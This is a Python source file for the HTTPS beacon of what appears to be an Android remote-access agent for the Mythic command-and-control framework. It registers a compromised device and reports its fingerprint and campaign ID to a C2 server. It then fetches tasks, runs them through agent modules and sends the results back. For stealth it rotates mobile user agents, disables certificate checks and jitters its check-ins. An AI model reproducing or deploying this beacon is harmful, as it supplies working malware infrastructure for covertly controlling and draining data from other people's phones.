
"""
HTTP Communication Client for Mythic Android Agent
Handles secure communication with C2 dashboard using HTTPS beacon profile
with encryption, authentication, and task serialization/deserialization.

Features:
- HTTP(S) beacon profile communication
- Task serialization/deserialization
- End-to-end encryption of communications
- Authentication with C2 dashboard
- Automatic retry with exponential backoff
- Certificate pinning bypass capabilities
- Mobile user-agent rotation for stealth
"""
import json
import time
import uuid
import base64
import hashlib
import hmac
import random
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
import ssl
import socket

try:
    import urllib.request
    import urllib.error
    import urllib.parse
except ImportError:

    pass

from utils.crypto import encrypt, decrypt, generate_key_pair, sign_data, verify_signature


@dataclass
class BeaconRequest:
    """Structure for beacon requests to C2 dashboard"""
    agent_id: str
    device_fingerprint: str
    campaign_id: str
    timestamp: int
    status: str
    device_info: Dict[str, Any]
    task_results: Optional[List[Dict]] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class TaskResponse:
    """Structure for task responses from C2 dashboard"""
    task_id: str
    command: str
    module: str
    args: Dict[str, Any]
    priority: str
    expires_at: int
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'TaskResponse':
        return cls(**data)


class MobileUserAgentRotator:
    """Rotates between realistic mobile user agents for stealth"""
    
    USER_AGENTS = [

        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        

        "Mozilla/5.0 (Mobile; rv:109.0) Gecko/109.0 Firefox/118.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/117.0",
        

        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
        

        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 EdgA/118.0.2088.69"
    ]
    
    def __init__(self):
        self._last_rotation = 0
        self._rotation_interval = random.randint(300, 600)
        self._current_agent = random.choice(self.USER_AGENTS)
    
    def get_user_agent(self) -> str:
        """Get current user agent, rotating if necessary"""
        current_time = time.time()
        if current_time - self._last_rotation > self._rotation_interval:
            self._current_agent = random.choice(self.USER_AGENTS)
            self._last_rotation = current_time
            self._rotation_interval = random.randint(300, 600)
        return self._current_agent


class HTTPSBeaconClient:
    """HTTP(S) Beacon Client for C2 Communication"""
    
    def __init__(self, config: Dict[str, Any], encryption_key: bytes):
        self.config = config
        self.encryption_key = encryption_key
        self.user_agent_rotator = MobileUserAgentRotator()
        

        self.c2_host = config.get('c2_host', 'localhost')
        self.c2_port = config.get('c2_port', 8443)
        self.c2_protocol = config.get('c2_protocol', 'https')
        self.c2_path = config.get('c2_path', '/beacon')
        

        self.api_key = config.get('api_key', '')
        self.private_key, self.public_key = generate_key_pair()
        

        self.max_retries = config.get('max_retries', 3)
        self.base_retry_delay = config.get('base_retry_delay', 2)
        self.max_retry_delay = config.get('max_retry_delay', 60)
        

        self.timeout = config.get('timeout', 30)
        self.verify_ssl = config.get('verify_ssl', False)
        

        self.session_id = str(uuid.uuid4())
        self.last_beacon = 0
        self.consecutive_failures = 0
        
    def _build_url(self, endpoint: str = '') -> str:
        """Build C2 URL with proper formatting"""
        if endpoint and not endpoint.startswith('/'):
            endpoint = '/' + endpoint
        return f"{self.c2_protocol}://{self.c2_host}:{self.c2_port}{self.c2_path}{endpoint}"
    
    def _get_request_headers(self) -> Dict[str, str]:
        """Get headers for HTTP requests with authentication"""
        timestamp = str(int(time.time()))
        nonce = str(uuid.uuid4())
        

        signature_data = f"{timestamp}:{nonce}:{self.session_id}"
        signature = sign_data(signature_data.encode(), self.private_key)
        
        return {
            'User-Agent': self.user_agent_rotator.get_user_agent(),
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Timestamp': timestamp,
            'X-Nonce': nonce,
            'X-Session-ID': self.session_id,
            'X-Signature': base64.b64encode(signature).decode(),
            'X-API-Key': self.api_key,
            'X-Requested-With': 'XMLHttpRequest'
        }
    
    def _encrypt_payload(self, data: Dict[str, Any]) -> str:
        """Encrypt payload for transmission"""
        try:
            json_data = json.dumps(data)
            encrypted = encrypt(json_data.encode(), self.encryption_key)
            return base64.b64encode(encrypted).decode()
        except Exception as e:
            raise Exception(f"Encryption failed: {e}")
    
    def _decrypt_response(self, encrypted_data: str) -> Dict[str, Any]:
        """Decrypt response from C2 server"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            decrypted = decrypt(encrypted_bytes, self.encryption_key)
            return json.loads(decrypted.decode())
        except Exception as e:
            raise Exception(f"Decryption failed: {e}")
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context with certificate pinning bypass"""
        context = ssl.create_default_context()
        
        if not self.verify_ssl:

            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        

        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        
        return context
    
    def _make_request(self, url: str, data: Optional[Dict] = None, method: str = 'GET') -> Dict[str, Any]:
        """Make HTTP request with proper error handling and retries"""
        headers = self._get_request_headers()
        

        request_data = None
        if data:
            if self.config.get('encrypt_communications', True):
                encrypted_payload = self._encrypt_payload(data)
                request_data = json.dumps({'encrypted': encrypted_payload}).encode()
            else:
                request_data = json.dumps(data).encode()
        

        req = urllib.request.Request(
            url,
            data=request_data,
            headers=headers,
            method=method
        )
        

        if self.c2_protocol == 'https':
            ssl_context = self._create_ssl_context()
            https_handler = urllib.request.HTTPSHandler(context=ssl_context)
            opener = urllib.request.build_opener(https_handler)
            urllib.request.install_opener(opener)
        

        for attempt in range(self.max_retries + 1):
            try:
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    response_data = response.read().decode()
                    

                    try:
                        parsed_response = json.loads(response_data)
                        

                        if 'encrypted' in parsed_response:
                            return self._decrypt_response(parsed_response['encrypted'])
                        else:
                            return parsed_response
                            
                    except json.JSONDecodeError:
                        return {'raw_response': response_data}
                        
            except (urllib.error.URLError, socket.timeout, ConnectionResetError) as e:
                if attempt == self.max_retries:
                    raise Exception(f"HTTP request failed after {self.max_retries + 1} attempts: {e}")
                

                delay = min(
                    self.base_retry_delay * (2 ** attempt),
                    self.max_retry_delay
                )
                jitter = random.uniform(0.1, 0.9)
                time.sleep(delay * jitter)
    
    def check_in(self, beacon_data: BeaconRequest) -> List[TaskResponse]:
        """Send beacon check-in to C2 dashboard and receive tasks"""
        try:
            url = self._build_url()
            

            payload = beacon_data.to_dict()
            payload['beacon_interval'] = self.config.get('beacon_interval', 300)
            payload['jitter'] = random.randint(10, 30)
            

            response = self._make_request(url, payload, 'POST')
            

            tasks = []
            if 'tasks' in response:
                for task_data in response['tasks']:
                    try:
                        task = TaskResponse.from_dict(task_data)
                        tasks.append(task)
                    except Exception as e:
                        print(f"[-] Failed to parse task: {e}")
            

            self.last_beacon = time.time()
            self.consecutive_failures = 0
            
            return tasks
            
        except Exception as e:
            self.consecutive_failures += 1
            print(f"[!] Beacon check-in failed: {e}")
            raise
    
    def post_response(self, task_id: str, result_data: bytes) -> bool:
        """Post task result back to C2 dashboard"""
        try:
            url = self._build_url('/task')
            

            payload = {
                'task_id': task_id,
                'agent_id': self.session_id,
                'timestamp': int(time.time()),
                'result': base64.b64encode(result_data).decode(),
                'status': 'completed'
            }
            
            response = self._make_request(url, payload, 'POST')
            
            return response.get('status') == 'received'
            
        except Exception as e:
            print(f"[!] Failed to post task response: {e}")
            return False
    
    def register_agent(self, device_info: Dict[str, Any]) -> bool:
        """Register agent with C2 dashboard"""
        try:
            url = self._build_url('/register')
            
            payload = {
                'session_id': self.session_id,
                'public_key': base64.b64encode(self.public_key).decode(),
                'device_info': device_info,
                'timestamp': int(time.time())
            }
            
            response = self._make_request(url, payload, 'POST')
            
            return response.get('status') == 'registered'
            
        except Exception as e:
            print(f"[!] Agent registration failed: {e}")
            return False
    
    def send_heartbeat(self) -> bool:
        """Send heartbeat to maintain connection"""
        try:
            url = self._build_url('/heartbeat')
            
            payload = {
                'session_id': self.session_id,
                'timestamp': int(time.time())
            }
            
            response = self._make_request(url, payload, 'POST')
            
            return response.get('status') == 'alive'
            
        except Exception as e:
            print(f"[!] Heartbeat failed: {e}")
            return False
    
    def get_connection_status(self) -> Dict[str, Any]:
        """Get current connection status and statistics"""
        return {
            'session_id': self.session_id,
            'last_beacon': self.last_beacon,
            'consecutive_failures': self.consecutive_failures,
            'c2_host': self.c2_host,
            'c2_port': self.c2_port,
            'protocol': self.c2_protocol,
            'ssl_verification': self.verify_ssl,
            'user_agent': self.user_agent_rotator.get_user_agent()
        }


class TaskExecutor:
    """Execute and manage tasks from C2 dashboard"""
    
    def __init__(self, agent_instance):
        self.agent = agent_instance
        self.active_tasks = {}
        self.task_history = []
    
    def execute_task(self, task: TaskResponse) -> Dict[str, Any]:
        """Execute a task and return results"""
        start_time = time.time()
        
        try:

            self.active_tasks[task.task_id] = {
                'task': task,
                'start_time': start_time,
                'status': 'executing'
            }
            

            if task.module in self.agent.modules:
                module = self.agent.modules[task.module]
                result = module.execute(task.command, task.args)
            else:
                result = {'error': f'Module {task.module} not available'}
            

            execution_time = time.time() - start_time
            result.update({
                'task_id': task.task_id,
                'execution_time': execution_time,
                'timestamp': int(time.time()),
                'status': 'completed'
            })
            

            self.active_tasks[task.task_id]['status'] = 'completed'
            self.active_tasks[task.task_id]['result'] = result
            

            self.task_history.append(self.active_tasks[task.task_id])
            del self.active_tasks[task.task_id]
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            error_result = {
                'task_id': task.task_id,
                'error': str(e),
                'execution_time': execution_time,
                'timestamp': int(time.time()),
                'status': 'failed'
            }
            

            if task.task_id in self.active_tasks:
                self.active_tasks[task.task_id]['status'] = 'failed'
                self.active_tasks[task.task_id]['result'] = error_result
                self.task_history.append(self.active_tasks[task.task_id])
                del self.active_tasks[task.task_id]
            
            return error_result
    
    def get_task_status(self) -> Dict[str, Any]:
        """Get current task execution status"""
        return {
            'active_tasks': len(self.active_tasks),
            'completed_tasks': len(self.task_history),
            'tasks': list(self.active_tasks.keys()),
            'last_execution': max([t.get('start_time', 0) for t in self.task_history]) if self.task_history else 0
        }



class HTTPSBeacon:
    """HTTPS Beacon C2 Profile for integration with MythicAgent"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.client = None
        self.task_executor = None
    
    def initialize(self, agent_instance, encryption_key: bytes):
        """Initialize the beacon with agent instance"""
        self.client = HTTPSBeaconClient(self.config, encryption_key)
        self.task_executor = TaskExecutor(agent_instance)
        return self.client.register_agent(agent_instance.get_device_info())
    
    def check_in(self, checkin_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check in with C2 dashboard"""
        beacon_request = BeaconRequest(
            agent_id=checkin_data['device_id'],
            device_fingerprint=checkin_data['device_fingerprint'],
            campaign_id=checkin_data['campaign_id'],
            timestamp=int(time.time()),
            status='active',
            device_info=checkin_data.get('android_version', {})
        )
        

        tasks = self.client.check_in(beacon_request)
        

        return [
            {
                'id': task.task_id,
                'command': task.command,
                'module': task.module,
                'args': task.args
            }
            for task in tasks
        ]
    
    def post_response(self, task_id: str, encrypted_data: bytes) -> bool:
        """Post task response to C2 dashboard"""
        return self.client.post_response(task_id, encrypted_data)
    
    def get_status(self) -> Dict[str, Any]:
        """Get beacon status information"""
        client_status = self.client.get_connection_status() if self.client else {}
        task_status = self.task_executor.get_task_status() if self.task_executor else {}
        
        return {
            'connection': client_status,
            'tasks': task_status
        }
